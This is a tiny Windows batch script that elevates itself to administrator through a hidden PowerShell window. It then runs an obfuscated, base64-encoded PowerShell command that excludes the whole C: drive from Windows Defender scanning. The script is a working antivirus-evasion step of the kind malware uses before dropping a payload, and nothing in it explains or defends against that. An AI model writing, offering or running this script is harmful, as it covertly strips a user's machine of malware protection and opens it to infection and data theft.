@echo off
openfiles >nul 2>nul
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c, %~s0' -Verb runAs"
    exit
)
powershell -WindowStyle Hidden -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAQwA6AFwAIgA=
